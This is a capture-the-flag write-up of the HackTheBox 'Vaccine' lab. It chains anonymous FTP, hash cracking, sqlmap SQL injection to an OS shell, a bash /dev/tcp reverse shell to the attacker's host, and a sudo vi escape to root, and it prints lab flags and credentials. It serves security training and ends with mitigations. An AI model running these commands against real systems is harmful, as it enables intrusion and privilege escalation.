# HTB — Vaccine

```
 ██╗   ██╗ █████╗  ██████╗ ██████╗██╗███╗   ██╗███████╗
 ██║   ██║██╔══██╗██╔════╝██╔════╝██║████╗  ██║██╔════╝
 ██║   ██║███████║██║     ██║     ██║██╔██╗ ██║█████╗  
 ╚██╗ ██╔╝██╔══██║██║     ██║     ██║██║╚██╗██║██╔══╝  
  ╚████╔╝ ██║  ██║╚██████╗╚██████╗██║██║ ╚████║███████╗
   ╚═══╝  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚═╝╚═╝  ╚═══╝╚══════╝
              HackTheBox — Starting Point
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — 21 (FTP), 22 (SSH), 80 (HTTP)
- [x] Anonymous FTP login → `backup.zip` downloaded
- [x] ZIP password cracked with `zip2john` + `john` → `741852963`
- [x] PHP source in ZIP — MD5 hash extracted → cracked → `qwerty789`
- [x] Web login as `admin:qwerty789` → `dashboard.php`
- [x] GET parameter SQL injection confirmed (PostgreSQL, DBA)
- [x] `sqlmap --os-shell` via `COPY ... FROM PROGRAM` → `postgres` shell
- [x] Reverse shell caught as `postgres`
- [x] PTY upgrade with `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- [x] `cat /var/lib/postgresql/user.txt` → user flag
- [x] `dashboard.php` source → PostgreSQL password `P@s5w0rd!`
- [x] `sudo -l` → `(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf`
- [x] GTFOBins vi escape: `:set shell=/bin/bash` + `:shell` → root
- [x] Root flag captured

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port discovery and service fingerprinting |
| FTP (anonymous) | Retrieve `backup.zip` from target |
| zip2john | Generate crackable hash from password-protected ZIP |
| John the Ripper | Crack ZIP password and MD5 hash |
| Firefox / Burp Suite | Web login and session cookie capture |
| sqlmap | SQL injection detection and `--os-shell` exploitation |
| Netcat | Reverse shell listener |
| python3 pty | PTY upgrade for interactive shell |
| GTFOBins (vi) | Privilege escalation via sudo-permitted editor |

---

## TL;DR

Three services, three layers to peel. Anonymous FTP hands you a password-protected ZIP. Crack the ZIP to get PHP source. PHP source has an MD5 hash — crack that too and you have the web admin password. The admin dashboard has a SQLi-vulnerable GET parameter against a PostgreSQL backend running as DBA, so `sqlmap --os-shell` gets you OS command execution via `COPY ... FROM PROGRAM`. Upgrade to a proper reverse shell as `postgres`, find the database password hardcoded in `dashboard.php`, use it to authenticate `sudo -l`, discover that `postgres` can run `vi` as root against a specific file. GTFOBins makes short work of that — `:set shell=/bin/bash` + `:shell` drops a root prompt, and the root flag is one `cat` away.

---

## Introduction

Vaccine is the third box in HTB's Starting Point track, and it introduces a concept that shows up constantly in real engagements: the attacker chain where each service hands you a credential or piece of information that unlocks the next one. FTP → ZIP → PHP source → web login → SQL injection → OS shell → sudo → root. No single step is complicated, but you have to be paying attention to realize you're collecting keys, not just poking random services.

The name "Vaccine" is a bit ironic given that the box's PostgreSQL instance is quite literally injecting things on your behalf. The database is running as a DBA-privileged user with `COPY ... FROM PROGRAM` enabled — a feature that was designed for data imports and has the side effect of letting you run arbitrary shell commands. As security missteps go, "DBA running the web backend" is one of the classics.

---

## Recon

### Port Scan

```bash
rustscan -a 10.129.29.113 --ulimit 5000 -b 2000 -t 2000 -- -sV -sC
```

Three open ports:

| Port | Service | Version/Notes |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.3 — anonymous login allowed |
| 22/tcp | SSH | OpenSSH 8.0p1 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.41 — "MegaCorp Login" page |

The FTP anonymous login flag is the immediate priority. Everything else can wait.

### Anonymous FTP Enumeration

```bash
ftp anonymous@10.129.29.113
```

Password: anything (blank, `anonymous`, `guest` — vsftpd doesn't care when anonymous is enabled).

```
230 Login successful.
ftp> ls
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
ftp> get backup.zip
```

`backup.zip` downloaded. One file, but it turns out to contain everything needed to proceed.

### Web Enumeration

The HTTP service on port 80 serves a "MegaCorp Login" page with username and password fields. No guest login option this time — this one wants credentials. Filed that away and went to work on the ZIP.

---

## Foothold

### Cracking the ZIP Password

The ZIP was password-protected. `zip2john` turns it into a crackable hash:

```bash
zip2john backup.zip > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
741852963        (backup.zip/index.php)
741852963        (backup.zip/style.css)
```

Password: `741852963`. Not exactly a passphrase designed to withstand scrutiny.

### Extracting and Reading the PHP Source

```bash
unzip backup.zip
# password: 741852963
```

Extracted two files: `index.php` and `style.css`. The CSS is decorative. The PHP is the treasure:

```bash
cat index.php
```

Relevant section:

```php
if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
```

Two things confirmed: the admin username is `admin`, and the password is validated by comparing its MD5 to `2cb42f8734ea607eefed3b70af13bbd3`. MD5 is not a password hashing function — it's a checksum algorithm that John is very happy to reverse given a wordlist.

### Cracking the MD5 Hash

```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > md5.hash
john md5.hash --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
```

```
qwerty789        (?)
```

Admin password: `qwerty789`. Cracked in seconds. Rockyou continues to be the gift that keeps on giving.

### Web Login

```
http://10.129.29.113/
Username: admin
Password: qwerty789
```

Logged in. Redirected to `dashboard.php` — a car catalogue search page for MegaCorp. The search field queries by make/model.

---

## Shell / Initial Access

### SQL Injection Discovery

The search feature used a GET parameter:

```
http://10.129.29.113/dashboard.php?search=Lazer
```

That URL parameter is a classic SQLi test candidate. Ran sqlmap with the authenticated session cookie:

```bash
sqlmap -u "http://10.129.29.113/dashboard.php?search=Lazer" \
  --cookie="PHPSESSID=[redacted]" \
  --batch --level=1 --risk=1
```

sqlmap confirmed multiple injection types:

- Boolean-based blind
- Error-based
- Stacked queries
- Time-based blind

Backend: **PostgreSQL**. Privilege level: **DBA** (superuser). That last detail matters — PostgreSQL's `COPY ... FROM PROGRAM` command is a DBA-only feature that executes shell commands.

### OS Shell via sqlmap

```bash
sqlmap -u "http://10.129.29.113/dashboard.php?search=Lazer" \
  --cookie="PHPSESSID=[redacted]" \
  --batch --level=1 --risk=1 \
  --os-shell
```

sqlmap used stacked queries to call `COPY ... FROM PROGRAM`, dropped a temporary PHP webshell, and presented an interactive prompt:

```
os-shell>
```

Quick identity check:

```
os-shell> whoami
postgres

os-shell> id
uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
```

Running as the `postgres` OS user. The `os-shell` is functional but non-interactive — no TTY, no job control, no way to run `sudo -l` with a password prompt. Time to upgrade to a real shell.

### Reverse Shell

Started a listener:

```bash
nc -lvnp 4444
```

From the sqlmap `os-shell`, sent a bash reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.92/4444 0>&1'
```

```
Connection received on 10.129.29.113 56342
bash: cannot set terminal process group (995): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$
```

Shell caught. Now to make it usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Proper PTY. Readline, job control, and — critically — the ability to enter a password at a sudo prompt.

---

## Escalation Path

### User Flag

```bash
cat /var/lib/postgresql/user.txt
```

```
ec9b13ca4d6229cd5cc1e09980965bf7
```

### Finding the PostgreSQL Password

Standard enumeration of web source files:

```bash
grep -nEi 'pass|user|postgres|db|connect' /var/www/html/*.php
```

```
/var/www/html/dashboard.php:41:    $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

PostgreSQL connection string hardcoded in `dashboard.php`. Password: `P@s5w0rd!`

This is the OS user `postgres`'s sudo password as well — the same account running both the database and the OS session.

### sudo Enumeration

```bash
sudo -l
[sudo] password for postgres: P@s5w0rd!
```

```
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", ...
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

`postgres` can run `vi` as any user (including root), restricted to a specific file. The file restriction is irrelevant — vi can spawn a shell from inside itself regardless of what file it opened. GTFOBins documents exactly this.

---

## Exploitation

### Privilege Escalation via vi GTFOBins

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

vi opened (with a terminal warning about TERM settings — `E558: Terminal entry not found in terminfo` — but opened nonetheless). From vi's Normal mode:

```
:set shell=/bin/bash
```

This tells vi which binary to use for shell escapes. Then:

```
:shell
```

This drops you to a shell with the privileges of the process running vi — which, because of `sudo`, is root.

```
root@vaccine:/var/lib/postgresql/11/main#
```

### Root Flag

```bash
cd /root
cat root.txt
```

```
dd6e058e814260bc70e9bbdef2715849
```

---

## Rabbit Holes

**`sudo -l` from the sqlmap os-shell:** The first instinct after landing the sqlmap `os-shell` was to immediately try `sudo -l`. It returned no output. The sqlmap shell runs commands through PostgreSQL's `COPY ... FROM PROGRAM`, which lacks a TTY — so any command that requires interactive input (like a password prompt) either hangs silently or produces no output. Wasted a couple of minutes on this before upgrading to a proper reverse shell.

**SUID binary enumeration:** Ran `find / -perm -4000 -type f 2>/dev/null` as postgres. The list was long — all standard Ubuntu SUID binaries (mount, su, sudo, gpasswd, etc.), nothing unusual. No custom SUID binary like Oopsie's `bugtracker`. The escalation path here was always sudo, not SUID.

**Trying password guesses before finding `dashboard.php`:** After getting the shell as `postgres`, spent a moment guessing passwords (`postgres`, `admin`, `vaccine`, the ZIP password) before running the grep against the web source files. Should have just grepped first — config files and PHP source are always the first stop for credential hunting.

**vi terminal warning:** The `E558: Terminal entry not found in terminfo` warning when launching vi looked concerning — like vi might not open properly and the GTFOBins escape might fail. In practice, vi still opened (defaulting to `ansi` terminal mode), and the `:set shell` + `:shell` sequence worked without issue. The Escape key displayed as `^[` in the shell, but the colon-prefixed commands still executed. Scary-looking, functionally irrelevant.

---

## Flag

| Flag | Value |
|---|---|
| User flag | `ec9b13ca4d6229cd5cc1e09980965bf7` |
| Root flag | `dd6e058e814260bc70e9bbdef2715849` |

---

## Mitigations

**Anonymous FTP with sensitive files:** The FTP service permitted anonymous read access and exposed `backup.zip` — a file containing application source code with embedded credentials. If FTP is required at all, anonymous access should be disabled. Sensitive backup files should never be accessible to unauthenticated users, regardless of protocol.

**Weak ZIP password and MD5 password storage:** `741852963` is a sequential keypad pattern and falls in the top 10% of rockyou entries. More critically, the application stored the admin password as a raw MD5 hash. MD5 is cryptographically broken for password storage — use bcrypt, scrypt, or Argon2 with appropriate work factors. The combination of a weak password and a fast hash meant cracking took seconds.

**SQL Injection in GET parameter:** The `search` parameter was passed directly into a SQL query with no parameterization. All database queries should use prepared statements with bound parameters. Input validation is a secondary defense, not a substitute for parameterization.

**PostgreSQL DBA running the web backend:** The web application connected to PostgreSQL as a DBA-privileged superuser. This is what enabled `COPY ... FROM PROGRAM` for OS command execution. Application database users should be granted only the minimum necessary privileges — SELECT/INSERT/UPDATE/DELETE on their own tables, nothing more. A least-privilege DB user cannot run `COPY ... FROM PROGRAM` regardless of what SQL injection succeeds.

**Hardcoded database credentials in source:** `dashboard.php` contained the full PostgreSQL connection string including the plaintext password. Database credentials belong in environment variables or a secrets manager, not in source code or config files that a shell user can read.

**`sudo` on a shell-capable editor:** Granting sudo access to `vi`, `vim`, `nano`, `less`, `more`, `awk`, `perl`, `python`, or any other program that can spawn a shell is functionally equivalent to granting a root shell. The file restriction in sudoers (`/bin/vi /etc/postgresql/11/main/pg_hba.conf`) does not help — the editor itself can spawn a shell regardless of which file it opened. If editing a specific file as root is genuinely required, consider using `sudoedit` (which invokes the editor with dropped privileges after copying the file) rather than `sudo vi`.

---

## Key Takeaway

This box is a clean demonstration of credential chaining: each service exposes just enough information to compromise the next one. FTP hands you the ZIP password's hash target; the ZIP exposes the web password hash; the web login grants access to the SQL injection; the SQL injection reaches the OS; and the OS user's password (found in a hardcoded config) unlocks the sudo rule that hands you root.

The critical technical lesson is PostgreSQL DBA privilege. `COPY ... FROM PROGRAM` is a documented, legitimate feature — but in the context of a SQL-injectable web application, it's an OS command execution primitive. Running web application database connections as superuser is the mistake that turned SQL injection into a full shell.

The sudo escalation reinforces a point worth repeating: editors are shells. Any sudoers entry allowing `vi`, `vim`, `nano`, `less`, `more`, or their relatives gives the grantee a root shell. The file restriction is theater.

---

## If I Did It Again

I'd grep the PHP source files for credentials immediately after landing the shell, before trying anything else. The pattern `grep -rEi 'pass|connect|password' /var/www/html/` takes five seconds and would have surfaced `P@s5w0rd!` before I wasted time trying sudo without a password.

For the sqlmap phase: I'd go straight to `--os-shell` after confirming the injection type, rather than running additional enumeration queries first. When you have stacked queries in PostgreSQL as DBA, `--os-shell` is the direct path — there's nothing the SQL enumeration would tell you that a shell couldn't tell you better.

The PTY upgrade step is worth doing immediately after the reverse shell connects — before any other enumeration. `python3 -c 'import pty; pty.spawn("/bin/bash")'` takes two seconds and makes everything else in the session more reliable. Running sudo without a proper PTY produces the "a terminal is required to read the password" error and wastes time debugging what should be a trivial password entry.

---

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-10-17 | Initial writeup |

---

<a name="top"></a>[↑ Back to top](#table-of-contents)
